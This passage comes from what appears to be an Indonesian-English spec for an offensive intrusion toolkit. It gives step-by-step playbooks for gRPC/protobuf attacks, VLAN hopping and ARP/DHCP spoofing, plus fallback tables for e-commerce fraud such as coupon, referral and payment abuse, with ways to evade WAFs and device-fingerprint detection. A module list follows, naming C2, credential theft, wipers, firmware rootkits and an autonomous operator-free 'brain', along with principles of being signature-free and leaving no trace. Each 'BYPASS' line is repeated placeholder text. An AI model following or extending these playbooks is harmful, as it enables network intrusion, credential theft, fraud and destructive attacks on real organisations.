   BYPASS: Use alternate method

FALLBACK:
Price Manip → Quantity Bypass → Coupon Abuse →
Referral Abuse → Payment Bypass → IDOR →
Step Skip → State Manipulate → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Payment race condition fails      │ 1. Retry dengan increased parallel threads
(stuck in pending state)          │ 2. Fallback ke IDOR payment endpoint
                                  │ 3. Abort and escalate ke refund abuse path
                                  │
Multiple coupon stacking blocked  │ 1. Try single coupon dengan higher value
by server-side validation         │ 2. Fallback ke promo abuse via expiry replay
                                  │ 3. Pivot ke referral abuse
                                  │
Negative quantity rejected by     │ 1. Try decimal quantity (0.1, 0.01)
integer validation                │ 2. Fallback ke quantity bypass via split accounts
                                  │ 3. Move ke loyalty points rounding abuse
                                  │
Workflow state transition denied  │ 1. Enumerate valid transitions via API response
                                  │ 2. Fallback ke direct step skip
                                  │ 3. Manipulate session state via cart poison
                                  │
Gift card enumeration rate-       │ 1. Slow down enumeration (rotate proxies)
limited by WAF                   │ 2. Fallback ke gift card return exploit
                                  │ 3. Pivot ke refund abuse path
                                  │
Referral dummy account detected   │ 1. Rotate device fingerprints (emulator)
by device clustering              │ 2. Use VPN + browser profile rotation
                                  │ 3. Fallback ke coupon stacking abuse
```

---

### 31.8 gRPC/Protobuf Attacks

```
GRPC_ATTACKS (6):

1. REFLECTION_LEAK
   WHAT: gRPC reflection dump untuk expose full API surface
   HOW:
   ├── Connect ke target gRPC endpoint
   ├── Query reflection service (grpc.reflection.v1alpha.ServerReflection)
   ├── Enumerate all services, methods, dan message types
   ├── Dump proto file structure (field types, oneof, enums)
   └── Use extracted schema untuk craft targeted attacks
   DETECTION: Monitor reflection endpoint access, rate-limit reflection queries
   BYPASS: Use alternate method

2. BIDI_FLOOD
   WHAT: Bidirectional streaming flood untuk exhaust server resources
   HOW:
   ├── Open bidirectional streaming connection ke target RPC
   ├── Send continuous stream requests tanpa waiting responses
   ├── Exhaust server-side stream handlers (goroutine / thread pool)
   ├── Maintain multiple parallel streams
   └── Server becomes unresponsive (DoS via resource exhaustion)
   DETECTION: Stream count monitoring, per-client connection limits
   BYPASS: Use alternate method

3. UNARY_FLOOD
   WHAT: Unary RPC flood untuk overwhelm server request processing
   HOW:
   ├── Identify target unary RPC method
   ├── Generate high-volume unary requests via connection pool
   ├── Maximize requests per second via HTTP/2 multiplexing
   ├── Include minimal payload untuk maximum throughput
   └── Server overwhelmed → latency spike atau complete DoS
   DETECTION: Request rate monitoring, HTTP/2 stream limits
   BYPASS: Use alternate method

4. METADATA_LEAK
   WHAT: Metadata information leak via gRPC headers dan trailing metadata
   HOW:
   ├── Send probe request ke target RPC
   ├── Capture response headers dan trailing metadata
   ├── Extract internal information (server version, auth tokens, internal IPs)
   ├── Correlate metadata across multiple calls
   └── Build target infrastructure profile from leaked metadata
   DETECTION: Metadata sanitization enforcement, header audit logging
   BYPASS: Use alternate method

5. TLS_BYPASS
   WHAT: gRPC TLS bypass untuk downgrade atau bypass transport encryption
   HOW:
   ├── Connect ke gRPC endpoint tanpa TLS (port opportunistic)
   ├── Exploit missing TLS enforcement pada reflection port
   ├── Intercept plaintext gRPC traffic
   ├── Extract authentication tokens dari metadata
   └── Replay captured requests via authenticated session
   DETECTION: TLS enforcement policy, plaintext connection rejection
   BYPASS: Use alternate method

6. DEADLINE_ABUSE
   WHAT: Deadline/timeout abuse untuk manipulate server-side processing
   HOW:
   ├── Send requests dengan extremely long deadline values
   ├── Server allocates resources untuk extended processing
   ├── Flood dengan long-deadline requests → resource exhaustion
   ├── Exploit deadline propagation ke downstream services
   └── Cascading timeout failure across service mesh
   DETECTION: Deadline cap enforcement, maximum timeout limits
   BYPASS: Use alternate method

GRPC_EXPLOIT (5):

1. AUTHZ_BYPASS
   WHAT: Authorization bypass via gRPC metadata manipulation
   HOW:
   ├── Intercept gRPC request flow
   ├── Add/modify authorization headers dalam metadata
   ├── Exploit missing server-side authz validation
   ├── Access admin-level RPC methods tanpa credentials
   └── Execute privileged operations via escalated access
   DETECTION: Metadata authorization enforcement, RBAC on gRPC methods
   BYPASS: Use alternate method

2. INJECTION_GRPC
   WHAT: Injection via gRPC method arguments
   HOW:
   ├── Identify gRPC methods accepting string/SQL parameters
   ├── Craft malicious protobuf messages dengan injection payloads
   ├── Inject SQL/NoSQL commands via message fields
   ├── Exploit unsanitized input handling dalam RPC handler
   └── Execute injected commands pada server-side database
   DETECTION: Input sanitization on gRPC message fields, parameterized queries
   BYPASS: Use alternate method

3. SSRF_GRPC
   WHAT: SSRF via gRPC resolvers dan service discovery fields
   HOW:
   ├── Identify gRPC fields accepting URLs atau service names
   ├── Craft protobuf message dengan attacker-controlled URL
   ├── Server-side makes request ke internal service
   ├── Enumerate internal network via error messages
   └── Access internal gRPC services tanpa direct network access
   DETECTION: URL validation, SSRF protection on outbound requests
   BYPASS: Use alternate method

4. ENUM_GRPC
   WHAT: Resource enumeration via gRPC List/Get methods
   HOW:
   ├── Query all available RPC methods via reflection
   ├── Identify List/Get methods accepting IDs atau filters
   ├── Enumerate resources via sequential ID iteration
   ├── Harvest sensitive data (users, orders, configs)
   └── Export enumerated data untuk further exploitation
   DETECTION: Enumeration rate limiting, access control on List methods
   BYPASS: Use alternate method

5. PROTO_POISON
   WHAT: Protobuf message poisoning untuk corrupt server-side data
   HOW:
   ├── Analyze target message schemas via reflection
   ├── Craft malformed protobuf messages
   ├── Inject unexpected field types atau extreme values
   ├── Exploit weak schema validation on server
   └── Corrupted data stored → application logic failure
   DETECTION: Schema validation enforcement, message size limits
   BYPASS: Use alternate method

PROTOBUF_ABUSE (4):

1. UNKNOWN_FIELD
   WHAT: Unknown field injection untuk bypass schema validation
   HOW:
   ├── Analyze target proto definition
   ├── Append unknown fields ke valid message
   ├── Server ignores unknown fields tapi processes message
   ├── Hidden logic triggered oleh unknown field values
   └── Bypass validation yang only checks known fields
   DETECTION: Strict schema validation, unknown field rejection
   BYPASS: Use alternate method

2. ONEOF_ABUSE
   WHAT: Oneof field confusion untuk exploit type confusion
   HOW:
   ├── Identify oneof field in proto definition
   ├── Set multiple fields within same oneof group
   ├── Exploit weak oneof validation (last-writer-wins)
   ├── Server processes incorrect field interpretation
   └── Trigger unintended logic branch
   DETECTION: Strict oneof validation, field presence checks
   BYPASS: Use alternate method

3. REPEATED_OVERFLOW
   WHAT: Repeated field overflow untuk exhaust server memory
   HOW:
   ├── Identify repeated (array) fields in message
   ├── Craft message dengan excessive repeated entries
   ├── Server allocates memory untuk full array processing
   ├── Memory exhaustion → DoS atau OOM crash
   └── Repeat with multiple concurrent connections
   DETECTION: Repeated field size limits, memory allocation caps
   BYPASS: Use alternate method

4. ANY_TYPE_ABUSE
   WHAT: Any type URL abuse untuk inject unexpected message types
   HOW:
   ├── Identify Any type fields in proto definition
   ├── Craft Any message dengan attacker-controlled type_url
   ├── Server attempts to deserialize ke specified type
   ├── Exploit weak type resolution logic
   └── Trigger deserialization vulnerability atau type confusion
   DETECTION: Any type whitelist enforcement, strict type resolution
   BYPASS: Use alternate method

FALLBACK:
Reflection Leak → Bidirectional Flood → Unary Flood →
Metadata Leak → TLS Bypass → Unknown Field → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
gRPC reflection endpoint returns   │ 1. Use connect-client tools (grpcurl, grpc_cli)
404 or disabled                   │ 2. Try proto file leak via /grpc-web endpoints
                                  │ 3. Fallback ke metadata leak via header probing
                                  │
Protobuf message larger than       │ 1. Split payload ke multiple repeated fields
400 bytes exceeds server limit     │ 2. Use nested messages untuk reduce top-level size
                                  │ 3. Fallback ke unknown field injection
                                  │
Bidirectional stream reset by      │ 1. Reduce stream count per connection
server (GOAWAY frame)             │ 2. Rotate client connections faster
                                  │ 3. Fallback ke unary flood approach
                                  │
TLS certificate pinning blocks    │ 1. Try plaintext port (non-TLS fallback)
TLS bypass attempt                │ 2. Use gRPC-Web proxy untuk MITM
                                  │ 3. Bypass via metadata leak on headers
                                  │
Authz bypass fails due to         │ 1. Extract token dari metadata leak
per-method RBAC                   │ 2. Fallback ke proto file injection
                                  │ 3. Enumerate accessible methods via list
                                  │
Oneof confusion rejected by       │ 1. Try repeated overflow as alternative
strict schema validator           │ 2. Abuse Any type URL field
                                  │ 3. Fallback ke reflection-assisted enumeration
```

---

### 31.9 VLAN Hopping

```
VLAN_ATTACKS (5):

1. DOUBLE_TAG
   WHAT: Double-tagging (802.1Q) attack untuk hop ke target VLAN
   HOW:
   ├── Identify native VLAN ID (default: 1)
   ├── Craft frame dengan outer 802.1Q tag = native VLAN
   ├── Embed inner 802.1Q tag = target VLAN ID
   ├── Send frame → switch strips outer tag (native VLAN)
   └── Frame forwarded ke target VLAN (inner tag processed)
   DETECTION: Double-tagged frame inspection, VLAN hopping detection
   BYPASS: Use alternate method

2. DTP_SPOOF
   WHAT: DTP (Dynamic Trunking Protocol) spoofing untuk create trunk link
   HOW:
   ├── Enable DTP on attacker's NIC (e.g., Yersinia, scapy)
   ├── Send DTP Dynamic Desirable / Dynamic Auto frames
   ├── Switch negotiates trunk link tanpa authentication
   ├── Attacker trunk link carries all VLANs
   └── Access any VLAN via trunk encapsulation
   DETECTION: DTP disabled on access ports, trunk negotiation monitoring
   BYPASS: Use alternate method

3. NATIVE_VLAN_ABUSE
   WHAT: Native VLAN manipulation untuk untagged traffic injection
   HOW:
   ├── Identify native VLAN configuration pada switch port
   ├── Send untagged frames pada native VLAN
   ├── Frames switched dalam native VLAN scope
   ├── Modify native VLAN ke high-value VLAN ID
   └── Untagged traffic now routed ke attacker-controlled VLAN
   DETECTION: Native VLAN mismatch alerts, untagged traffic monitoring
   BYPASS: Use alternate method

4. TRUNK_NEGOTIATE
   WHAT: Trunk negotiation untuk establish unauthorized trunk link
   HOW:
   ├── Configure attacker port dengan DTP trunking mode
   ├── Send DTP frames ke switch port
   ├── Switch accepts trunk negotiation
   ├── All VLANs accessible via trunk
   └── Capture/inject traffic across all VLANs
   DETECTION: Unauthorized trunk detection, DTP frame monitoring
   BYPASS: Use alternate method

5. VLAN_SHIFT
   WHAT: VLAN tag shifting untuk bypass VLAN-based segmentation
   HOW:
   ├── Craft frame dengan shifted/malformed 802.1Q header
   ├── Exploit switch parsing vulnerability
   ├── Frame processed dalam unexpected VLAN context
   ├── Bypass VLAN-based access control
   └── Access restricted VLAN segment
   DETECTION: 802.1Q header validation, malformed frame rejection
   BYPASS: Use alternate method

VLAN_EXPLOIT (4):

1. INTER_VLAN
   WHAT: Inter-VLAN routing attack untuk cross-segment access
   HOW:
   ├── Map inter-VLAN routing configuration
   ├── Identify router-on-a-stick atau L3 switch
   ├── Exploit weak ACLs between VLANs
   ├── Inject traffic ke routing interface
   └── Route between VLANs tanpa legitimate authorization
   DETECTION: Inter-VLAN routing audit, ACL enforcement verification
   BYPASS: Use alternate method

2. PRIVATE_VLAN
   WHAT: Private VLAN bypass untuk access isolated ports
   HOW:
   ├── Identify PVLAN configuration (primary + secondary)
   ├── Determine PVLAN type (isolated, community, promiscuous)
   ├── Craft frames ke exploit PVLAN forwarding logic
   ├── Access isolated ports tanpa going through promiscuous port
   └── Bypass host isolation within same subnet
   DETECTION: PVLAN configuration audit, inter-port communication monitoring
   BYPASS: Use alternate method

3. MANAGEMENT_VLAN
   WHAT: Management VLAN access untuk network device control
   HOW:
   ├── Identify management VLAN ID (e.g., VLAN 1, VLAN 99)
   ├── Obtain access via VLAN hopping atau DTP spoof
   ├── Access switch management interface (SSH, HTTP)
   ├── Extract or modify network device configurations
   └── Full network infrastructure compromise
   DETECTION: Management VLAN access logging, unauthorized management access alerts
   BYPASS: Use alternate method

4. VOICE_VLAN
   WHAT: Voice VLAN exploitation untuk network pivot
   HOW:
   ├── Identify voice VLAN ID (CDP/LLDP advertisement)
   ├── Configure attacker NIC untuk voice VLAN tagging
   ├── Join voice VLAN network segment
   ├── Access voice VLAN resources (phones, call servers)
   └── Pivot ke data network via voice VLAN misconfiguration
   DETECTION: Voice VLAN port assignment monitoring, CDP/LLDP audit
   BYPASS: Use alternate method

VLAN_DEFENSE_BYPASS (4):

1. ACL_BYPASS
   WHAT: ACL bypass via VLAN hopping untuk bypass network filtering
   HOW:
   ├── Identify ACL placement (ingress/egress)
   ├── Hop ke VLAN yang tidak covered oleh ACL
   ├── Access target resources via alternate VLAN path
   ├── Bypass firewall rules via VLAN-based redirect
   └── Reach protected resources tanpa triggering ACL
   DETECTION: ACL coverage audit across all VLANs, cross-VLAN policy enforcement
   BYPASS: Use alternate method

2. FIREWALL_HOP
   WHAT: Firewall hop via VLAN untuk bypass network segmentation
   HOW:
   ├── Map firewall VLAN interfaces
   ├── Identify unfiltered VLAN path
   ├── Route traffic ke attacker-controlled VLAN
   ├── Firewall rules not applicable ke new VLAN context
   └── Access internal network tanpa firewall detection
   DETECTION: Firewall VLAN interface audit, cross-VLAN traffic monitoring
   BYPASS: Use alternate method

3. SEGMENTATION_BYPASS
   WHAT: Network segmentation bypass via VLAN manipulation
   HOW:
   ├── Identify network segmentation boundaries
   ├── Exploit VLAN misconfiguration atau default settings
   ├── Hop ke restricted segments via VLAN pivot
   ├── Access segmented resources (DB servers, admin systems)
   └── Full segmentation breach
   DETECTION: Segmentation integrity testing, VLAN audit
   BYPASS: Use alternate method

4. MONITORING_EVASION
   WHAT: Monitoring evasion via VLAN misdirection
   HOW:
   ├── Identify monitoring/NIDS placement pada specific VLANs
   ├── Route attack traffic via unmonitored VLAN
   ├── Bypass IDS/IPS sensors via VLAN hopping
   ├── Execute attack tanpa triggering monitoring alerts
   └── Evade detection by staying outside monitored segments
   DETECTION: Monitoring coverage across all VLANs, sensor placement audit
   BYPASS: Use alternate method

FALLBACK:
Double Tag → DTP Spoof → Native VLAN → Trunk Negotiate →
VLAN Shift → Inter-VLAN → Private VLAN → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
DTP disabled on all switch ports  │ 1. Try double-tagging (802.1Q) attack
(prevents trunk negotiation)      │ 2. Exploit native VLAN misconfiguration
                                  │ 3. Fallback ke inter-VLAN routing exploit
                                  │
Double-tag frame dropped by       │ 1. Try VLAN tag shifting technique
managed switch with VLAN hopping  │ 2. Pivot ke management VLAN via CDP
protection                        │ 3. Fall back ke ARP/DHCP spoofing path
                                  │
Voice VLAN access restricted      │ 1. Enumerate via LLDP neighbor discovery
by port security                  │ 2. Try private VLAN bypass
                                  │ 3. Fallback ke monitoring evasion path
                                  │
Private VLAN properly enforced    │ 1. Try inter-VLAN routing exploit
(no cross-port communication)     │ 2. Exploit promiscuous port access
                                  │ 3. Pivot ke firewall hop technique
                                  │
ACL covers all VLAN transitions   │ 1. Identify VLAN without ACL coverage
                                  │ 2. Try segmentation bypass via routing misconfig
                                  │ 3. Fall back ke ARP spoofing for local pivot
                                  │
All ports in same VLAN            │ 1. Try management VLAN discovery via CDP
(no VLAN segmentation)           │ 2. Direct ARP-based attack path
                                  │ 3. Fallback ke DHCP spoofing
```

---

### 31.10 ARP/DHCP Spoofing

```
ARP_ATTACKS (5):

1. ARP_SPOOF
   WHAT: ARP cache poisoning menggunakan Ettercap atau arpspoof
   HOW:
   ├── Enable IP forwarding pada attacker machine
   ├── Send gratuitous ARP replies ke victim (claim gateway IP)
   ├── Send gratuitous ARP replies ke gateway (claim victim IP)
   ├── Victim ARP cache poisoned → traffic routes via attacker
   └── Intercept, modify, atau relay traffic (MITM position)
   DETECTION: ARP table anomaly, duplicate IP detection, static ARP entries
   BYPASS: Use alternate method

2. ARP_REPLAY
   WHAT: ARP replay attack untuk flood ARP cache dengan poisoned entries
   HOW:
   ├── Capture legitimate ARP packets dari network
   ├── Modify MAC address field → point ke attacker
   ├── Replay modified ARP packets ke broadcast domain
   ├── ARP cache flooded dengan poisoned entries
   └── Network traffic diverted ke attacker
   DETECTION: ARP storm detection, excessive ARP reply rate monitoring
   BYPASS: Use alternate method

3. ARP_DOS
   WHAT: ARP flood DoS untuk disrupt network connectivity
   HOW:
   ├── Generate massive ARP requests/replies tanpa valid targets
   ├── Flood network broadcast domain dengan ARP traffic
   ├── Victim's ARP table overflow (limited size)
   ├── Legitimate ARP entries evicted → communication breakdown
   └── Network-wide disruption (DoS)
   DETECTION: ARP flood rate monitoring, broadcast storm detection
   BYPASS: Use alternate method

4. ARP_TABLE_POISON
   WHAT: ARP table manipulation untuk redirect traffic flow
   HOW:
   ├── Send targeted ARP replies ke specific hosts
   ├── Poison ARP cache untuk redirect traffic paths
   ├── Modify ARP entries untuk impersonate trusted hosts
   ├── Traffic rerouted tanpa victim awareness
   └── Persistent poisoning via periodic ARP refresh
   DETECTION: ARP table change monitoring, trusted ARP entry alerts
   BYPASS: Use alternate method

5. GRATUITOUS_ARP
   WHAT: Gratuitous ARP spoofing untuk hijack network identity
   HOW:
   ├── Send unsolicited ARP announcements ke broadcast
   ├── Claim ownership of gateway IP address
   ├── All hosts update ARP cache → attacker becomes gateway
   ├── Intercept all outbound traffic
   └── Full MITM position established
   DETECTION: Duplicate IP detection, gratuitous ARP monitoring
   BYPASS: Use alternate method

DHCP_ATTACKS (5):

1. DHCP_STARVATION
   WHAT: DHCP address starvation untuk exhaust IP address pool
   HOW:
   ├── Generate thousands of DHCP DISCOVER requests
   ├── Use random MAC addresses untuk each request
   ├── DHCP server allocates IP ke each request
   ├── IP pool exhausted → no IPs available
   └── Legitimate clients cannot obtain IP (DoS)
   DETECTION: DHCP pool exhaustion alerts, abnormal DISCOVER rate
   BYPASS: Use alternate method

2. DHCP_SPOOF
   WHAT: Rogue DHCP server untuk intercept client network configuration
   HOW:
   ├── Deploy rogue DHCP server pada network segment
   ├── Respond faster ke DHCP DISCOVER than legitimate server
   ├── Assign attacker-controlled default gateway
   ├── Assign attacker-controlled DNS server
   └── Client traffic routed via attacker (MITM position)
   DETECTION: Rogue DHCP detection, DHCP snooping
   BYPASS: Use alternate method

3. DHCP_OPTION_ABUSE
   WHAT: DHCP option manipulation untuk inject malicious configuration
   HOW:
   ├── Intercept DHCP OFFER/ACK messages
   ├── Modify DHCP options (DNS, gateway, domain search list)
   ├── Inject malicious DNS server via option 6
   ├── Inject malicious TFTP server via option 66
   └── Client configuration poisoned
   DETECTION: DHCP option monitoring, configuration integrity checks
   BYPASS: Use alternate method

4. DHCP_ROGUE
   WHAT: DHCP rogue reply (NAK/ACK spoofing) untuk disrupt or redirect
   HOW:
   ├── Monitor DHCP REQUEST messages
   ├── Send forged DHCP NAK → client forced ke re-negotiate
   ├── Send forged DHCP ACK → client accepts rogue configuration
   ├── Timing window exploitation untuk maximize impact
   └── Client temporarily disrupted atau permanently misconfigured
   DETECTION: DHCP NAK/ACK rate monitoring, rogue response detection
   BYPASS: Use alternate method

5. DHCP_REBIND
   WHAT: DHCP rebinding attack untuk hijack renewed leases
   HOW:
   ├── Wait untuk DHCP lease expiry (T1/T2 timer)
   ├── Client sends DHCP REQUEST ke original server
   ├── Intercept → respond with rogue DHCP ACK
   ├── Client rebinding redirected ke attacker-controlled config
   └── Persistent MITM via lease renewal hijack
   DETECTION: DHCP rebinding anomaly, unexpected server responses
   BYPASS: Use alternate method

MITM_EXPLOIT (6):

1. MITM_ARP
   WHAT: ARP-based man-in-the-middle untuk intercept unencrypted traffic
   HOW:
   ├── ARP poison victim + gateway (see ARP_SPOOF)
   ├── Enable IP forwarding untuk relay traffic
   ├── Capture plaintext traffic (HTTP, FTP, Telnet)
   ├── Extract credentials dan sensitive data
   └── Modify traffic in-flight (inject content, redirect)
   DETECTION: ARP spoofing detection, encrypted traffic monitoring
   BYPASS: Use alternate method

2. MITM_DHCP
   WHAT: DHCP-based man-in-the-middle untuk configuration hijack
   HOW:
   ├── Deploy rogue DHCP server (see DHCP_SPOOF)
   ├── Assign attacker-controlled gateway
   ├── All victim traffic routes via attacker
   ├── Intercept ke decrypt (if SSL stripping successful)
   └── Persistent MITM via DHCP lease management
   DETECTION: DHCP snooping, gateway validation
   BYPASS: Use alternate method

3. MITM_DNS
   WHAT: DNS hijacking via ARP/DHCP untuk redirect domain resolution
   HOW:
   ├── ARP poison + rogue DNS server via DHCP option 6
   ├── Intercept DNS queries dari victim
   ├── Respond dengan attacker-controlled IP untuk target domains
   ├── Victim connects ke attacker-controlled server
   └── Harvest credentials via fake login pages
   DETECTION: DNS response validation, DNSSEC verification
   BYPASS: Use alternate method

4. SSLSTRIP
   WHAT: SSLStrip downgrade untuk downgrade HTTPS ke HTTP
   HOW:
   ├── Establish MITM position (ARP/DHCP based)
   ├── Intercept HTTPS redirect responses
   ├── Strip SSL/TLS upgrade headers
   ├── Present HTTP version tanpa TLS to victim
   ├── Victim interacts tanpa encryption
   └── Credentials captured in plaintext
   DETECTION: HSTS enforcement, certificate pinning validation
   BYPASS: Use alternate method

5. SESSION_HIJACK
   WHAT: Session hijacking via MITM untuk hijack authenticated sessions
   HOW:
   ├── Establish MITM position via ARP/DHCP poisoning
   ├── Intercept session cookies dari plaintext traffic
   ├── Replay session tokens via attacker browser
   ├── Access victim's authenticated sessions
   └── Full account takeover tanpa credentials
   DETECTION: Session binding, IP-based session validation, token rotation
   BYPASS: Use alternate method

6. CREDENTIAL_HARVEST
   WHAT: Credential harvesting via MITM untuk mass credential theft
   HOW:
   ├── Establish network-wide MITM (ARP spoof + rogue DHCP)
   ├── Inject credential harvesting form via HTTP injection
   ├── Present fake login pages untuk target services
   ├── Capture submitted credentials
   └── Aggregate harvested credentials untuk lateral movement
   DETECTION: Form injection detection, credential submission monitoring
   BYPASS: Use alternate method

FALLBACK:
ARP Spoof → DHCP Starvation → Rogue DHCP →
MITM ARP → SSLStrip → Session Hijack → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
DHCP snooping blocks rogue        │ 1. Try ARP spoofing instead (no DHCP needed)
DHCP server responses             │ 2. Exploit DHCP snooping bypass via trusted port
                                  │ 3. Fallback ke static IP assignment + ARP poison
                                  │
ARP poisoning detected by NAC     │ 1. Try gratuitous ARP (lower detection profile)
or endpoint protection            │ 2. Use DHCP option abuse for config hijack
                                  │ 3. Fallback ke DNS hijacking path
                                  │
IP forwarding blocked by host     │ 1. Use responder / nbtspoof untuk local capture
OS (Windows default)              │ 2. Try DHCP starvation + rogue DHCP
                                  │ 3. Fallback ke SSLStrip + credential harvest
                                  │
HSTS prevents SSLStrip downgrade  │ 1. Try session hijacking via cookie theft
                                  │ 2. Use ARP spoofing + DNS hijack combination
                                  │ 3. Fallback ke direct credential injection
                                  │
DHCP pool too large for           │ 1. Focus on DHCP spoofing (rogue server)
starvation to exhaust             │ 2. Try ARP-based MITM instead
                                  │ 3. Use DHCP option abuse untuk partial hijack
                                  │
Static ARP entries prevent        │ 1. Try DHCP starvation + rogue server
cache poisoning                   │ 2. Use monitoring evasion via unmonitored VLAN
                                  │ 3. Fallback ke VLAN hopping path
```

---
## 32. STATISTIK TOTAL

| Domain | Modul |
|--------|-------|
| C2 Framework | 98+ agents, 18 listeners, Malleable, SMB Beacon, Channel Rotation, Env Detection, Resilience |
| SQL Injection | 60+ modules (8 DBMS, 12+ WAF bypass) |
| NoSQL Injection | 20+ modules (5 DBMS) |
| Database Post-Exploit | 25+ modules (4 DBMS) |
| Evasion & Stealth | 50+ modules (11 sleep, 7 syscall, 15 anti-analysis, 7 injection) |
| AD Attack | 40+ modules (12 Kerberos, 16 ADCS, 8 recon, DCSync, delegation) |
| Lateral Movement | 30+ modules + SMB Beacon |
| Persistence | 40+ modules (4 OS + re-persist) |
| Hardware Rootkit | 20+ modules (UEFI, SMM, Firmware) |
| Credential Theft | 65+ modules (LSASS, Browser, Wallet, Gaming, VPN, Cloud, Token, Session, MFA, Biometric) |
| Collector | 15+ modules |
| Destruction | 30+ modules (timing chain) |
| Orchestrator | 25+ modules (Fireteam + MCP + AI) |
| Brain | 5+ modules |
| Infrastructure | 20+ modules (4 VPC) |
| OSINT | 25+ modules |
| Exploitation | 40+ modules |
| Forensic Evidence | 15+ modules |
| Reporting | 15+ modules |
| Cleanup | 15+ modules |
| Auth Bypass | 20+ modules |
| Network Evasion | 10+ modules |
| Destruction Chain | 3+ modules |
| Implant Generator | 3+ modules |
| Container/K8s | 26+ modules (8 Docker, 12 K8s, 6 Privesc) |
| Cloud Deep | 54+ modules (20 AWS, 18 Azure, 16 GCP) |
| Social Engineering | 23+ modules (8 phishing, 5 pretexting, 6 OSINT, 4 campaign) |
| Wireless | 22+ modules (8 WiFi, 5 BT, 4 RFID/NFC, 5 tools) |
| Supply Chain | 22+ modules (6 dependency, 6 CI/CD, 4 package, 6 build) |
| API Security | 24+ modules (8 auth, 6 business logic, 5 injection) |
| Mobile Deep | 26+ modules (10 iOS, 10 Android, 6 universal) |
| Physical Security | 21+ modules (5 USB, 4 lock, 3 badge, 4 enum, 5 tools) |
| Purple Team | 23+ modules (8 detection, 6 SOC, 5 MITRE, 4 report) |
| Threat Intelligence | 19+ modules (6 IOC, 4 MITRE, 5 feed, 4 report) |
| Incident Response | 22+ modules (6 sim, 6 counter, 5 playbook, 5 tools) |
| Zero Trust | 21+ modules (6 identity, 6 network, 5 app, 4 data) |
| Web3/DeFi | 22+ modules (8 contract, 6 DeFi, 5 wallet, 3 NFT) |
| Malware Analysis | 27+ modules (6 static, 6 dynamic, 5 unpack, 5 evasion) |
| AI/ML Attacks | 21+ modules (6 model, 5 prompt, 5 infra, 5 safety) |
| IPv6 Attacks | 13+ modules (5 NDP, 4 DNSv6, 4 transition) |
| mDNS/LLMNR/NBT-NS | 15+ modules (4 mDNS, 4 LLMNR, 4 NBT-NS, 3 WPAD) |
| SAML/OIDC | 15+ modules (6 SAML, 5 OIDC, 4 OAuth) |
| LDAP Injection | 10+ modules (6 attack, 4 abuse) |
| CSRF | 10+ modules (6 attack, 4 exploit) |
| Open Redirect | 9+ modules (5 attack, 4 exploit) |
| File Upload Bypass | 12+ modules (8 bypass, 4 exploit) |
| Subdomain Takeover | 14+ modules (6 method, 8 target) |
| Web Cache Poisoning | 10+ modules (6 attack, 4 exploit) |
| HTTP Request Smuggling | 10+ modules (6 attack, 4 exploit) |
| DNSSEC Bypass | 8+ modules (5 attack, 3 abuse) |
| Certificate Forgery | 10+ modules (6 attack, 4 abuse) |
| TLS 1.3 Attacks | 9+ modules (5 attack, 4 abuse) |
| SCADA/ICS | 10+ modules (5 protocol, 5 exploit) |
| IoT Attacks | 13+ modules (8 attack, 5 exploit) |
| Compliance Testing | 25+ modules (8 PCI, 6 HIPAA, 6 GDPR, 5 ISO) |
| Methodology Mapping | 28+ modules (7 PTES, 10 OWASP, 6 NIST, 5 OSSTMM) |
| OPSEC Procedures | 20+ modules (6 comms, 6 data, 8 ops) |
| Multi-Cloud | 12+ modules (6 cross-cloud, 6 cloud-native) |
| Web Misc | 10+ modules (host header, SMS, email, log, header, response, session, clickjacking, tabnabbing, prototype) |
| Memory Corruption | 26+ modules (8 buffer, 8 heap, 4 format, 6 ROP/shellcode) |
| Deserialization | 24+ modules (6 Java, 5 Python, 5 PHP, 5 .NET, 3 Ruby) |
| Race Conditions | 16+ modules (5 TOCTOU, 6 concurrent, 5 state) |
| GraphQL Deep | 18+ modules (8 attack, 6 exploit, 4 infra) |
| Cryptographic Attacks | 21+ modules (4 padding, 5 hash, 7 crypto, 5 cert) |
| Password Reset | 16+ modules (7 bypass, 4 enum, 5 abuse) |
| Business Logic | 19+ modules (7 logic, 6 payment, 6 flow) |
| gRPC/Protobuf | 15+ modules (6 attack, 5 exploit, 4 protobuf) |
| VLAN Hopping | 13+ modules (5 attack, 4 exploit, 4 defense bypass) |
| ARP/DHCP Spoofing | 16+ modules (5 ARP, 5 DHCP, 6 MITM) |
| Test Scenarios | 1346 test cases (TC-001 – TC-1346, semua 70 layer) |
| **TOTAL** | **~2100+ modules** |

---

## 33. PRINSIP DASAR

1. **"No copy-paste"** — tiap baris ditulis sendiri.
2. **"If I can't explain every line, it doesn't go in"**
3. **"Signature-free"** — defender gak kenal.
4. **"Modular"** — tiap modul jalan sendiri, tapi orchestrated.
5. **"Evidentiary"** — tiap action ada bukti.
6. **"Clean"** — post-engagement, semua hilang.
7. **"Resilient"** — setiap kegagalan ada fallback.
8. **"Adaptive"** — beradaptasi dengan environment.
9. **"Autonomous"** — keputusan tanpa operator jika perlu.
10. **"Observable"** — setiap aksi log dan terukur.

---

## 34. CHECKLIST FINAL

| # | Layer | Status |
|---|-------|--------|
| 1 | C2 Framework (98+ Agents + Malleable + SMB Beacon + Channel Rotation + Env Detection + Resilience) | [ ] |
| 2 | The Decoy / Deception Layer | [ ] |
| 3 | SQL Injection Engine (8 DBMS + 12 WAF bypass) | [ ] |
| 4 | NoSQL Injection Engine (5 DBMS) | [ ] |
| 5 | Database Post-Exploit (khunt-style) | [ ] |
| 6 | C2 Evasion (11 Sleep + 7 Syscall + AMSI/ETW + 15 Anti-Analysis + 7 Injection + Logs + Network) | [ ] |
| 7 | AD Attack (12 Kerberos + 16 ADCS + DCSync + Delegation) | [ ] |
| 8 | Lateral Movement (30+ techniques + SMB Beacon + Pivoting) | [ ] |
| 9 | Persistence (11 Win + 9 Linux + 6 Mac + 5 Android + re-persist) | [ ] |
| 10 | Hardware Rootkit (UEFI + SMM + Firmware) | [ ] |
| 11 | Credential Theft (65+ modules) | [ ] |
| 12 | Collector / InfoStealer | [ ] |
| 13 | Destruction (JADEPUFFER + MAD-CAT + Wiper + Timing) | [ ] |
| 14 | Orchestrator (LangGraph + MCP + Fireteam) | [ ] |
| 15 | Autonomous Brain | [ ] |
| 16 | Infrastructure (Terraform + Ansible + 4 VPC) | [ ] |
